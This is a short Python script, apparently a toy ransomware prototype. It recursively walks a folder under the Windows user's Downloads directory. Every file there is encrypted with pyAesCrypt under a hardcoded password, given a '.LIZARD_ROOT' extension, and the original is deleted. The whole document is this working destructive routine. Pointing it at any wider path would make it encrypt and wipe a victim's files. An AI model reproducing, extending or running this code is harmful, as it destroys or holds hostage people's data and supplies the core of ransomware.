import pyAesCrypt
import os

def crypt_file(file):
	password = 'test'
	bufferSize = 512 * 1024
	pyAesCrypt.encryptFile(str(file), str(file) + '.LIZARD_ROOT', password, bufferSize)
	os.remove(file)

def search_dir(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		if os.path.isfile(path) == True:
			crypt_file(path)
		else:
			search_dir(path)

search_dir(os.environ['HOMEDRIVE'] + os.environ['HOMEPATH'] + '\\Downloads\\new\\')